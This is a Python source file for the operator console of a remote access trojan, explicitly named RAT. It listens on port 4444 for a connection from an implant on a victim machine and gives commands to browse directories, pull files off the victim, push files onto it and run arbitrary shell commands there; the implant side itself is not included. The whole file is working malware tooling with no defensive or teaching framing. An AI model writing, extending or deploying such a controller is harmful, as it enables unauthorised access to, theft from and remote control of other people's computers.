from enum import Enum
from sys import argv
from cmd import Cmd
import socket, os


class Command(Enum):
    LS = 0
    CD = 1
    DOWNLOAD = 2
    UPLOAD = 3
    SH = 4


class RAT(Cmd):
    s = None

    def accept(self):
        port = int(argv[1])

        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('', 4444))
        s.listen()
        print('[*] Listening')
        conn, addr = s.accept()
        print('[+] Connection from:', addr[0])
        s.close()

        self.s = conn
        self.prompt = '({})> '.format(addr[0])

    def _send_command(self, command):
        self.s.send(bytes([command.value]))

    def do_ls(self, _):
        self._send_command(Command.LS)
        while True:
            length = self.s.recv(1)[0]
            if not length:
                break
            name = self.s.recv(length, socket.MSG_WAITALL).decode()
            print(name, end=' ')
        print()

    def do_cd(self, args):
        path = args.split()[0]
        self._send_command(Command.CD)
        self.s.send(bytes([len(path)]) + path.encode())

    def do_download(self, args):
        filename = args.split()[0]
        self._send_command(Command.DOWNLOAD)
        self.s.send(bytes([len(filename)]) + filename.encode())

        file_size = int.from_bytes(self.s.recv(8), 'little')
        if not file_size:
            print('[-] Download error')
        print('[*] File size:', file_size)
        file = open(filename, 'wb')
        file.write(self.s.recv(file_size, socket.MSG_WAITALL))
        file.close()
        print('[+] Download done')

    def do_upload(self, args):
        filename = args.split()[0]
        self._send_command(Command.UPLOAD)
        self.s.send(bytes([len(filename)]) + filename.encode())

        result = self.s.recv(1)[0]
        if not result:
            print('[-] Upload error')

        size = os.path.getsize(filename)
        print('[*] File size:', size)
        self.s.send(size.to_bytes(8, 'little'))
        file = open(filename, 'rb')
        self.s.sendfile(file)
        file.close()
        print('[+] Upload done')

    def do_sh(self, command):
        self._send_command(Command.SH)
        self.s.send(len(command).to_bytes(1, 'little') + command.encode())
        while True:
            data = self.s.recv(1024)
            if data[-1] == 0x4:  # end of transmission
                return
            print(data.decode(), end='')


if __name__ == '__main__':
    rat = RAT()
    rat.accept()
    try:
        rat.cmdloop()
    except KeyboardInterrupt:
        rat.s.close()
